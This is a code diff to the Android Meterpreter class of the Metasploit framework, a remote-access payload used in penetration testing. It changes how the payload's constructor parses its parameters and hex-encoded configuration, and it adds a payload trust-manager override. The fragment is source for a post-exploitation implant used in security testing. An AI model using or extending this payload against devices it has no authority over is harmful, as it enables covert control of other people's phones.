@@ -118,17 +118,17 @@ public class AndroidMeterpreter extends Meterpreter {
         return context;
     }
 
-    public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, Object[] parameters, boolean redirectErrors) throws Exception {
+    public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, String[] parameters, boolean redirectErrors) throws Exception {
         super(in, rawOut, true, redirectErrors, false);
-        writeableDir = (String)parameters[0];
-        byte[] config = (byte[]) parameters[1];
+        writeableDir = parameters[0];
         try {
             findContext();
         } catch (Exception e) {
             e.printStackTrace();
         }
-        if (config != null && config[0] != 0) {
-            loadConfiguration(in, rawOut, config);
+        if (parameters.length > 1 && parameters[1].charAt(0) != ' ') {
+            byte[] configBytes = Utils.hexStringToByteArray(parameters[1]);
+            loadConfiguration(in, rawOut, configBytes);
         } else {
             int configLen = in.readInt();
             byte[] configBytes = new byte[configLen];
@@ -141,6 +141,11 @@ public class AndroidMeterpreter extends Meterpreter {
         this.intervalCollectionManager.start();
         startExecuting();
         this.intervalCollectionManager.stop();
+    }
+
+    @Override
+    protected String getPayloadTrustManager() {
+        return "com.metasploit.stage.PayloadTrustManager";
     }
 
     @Override
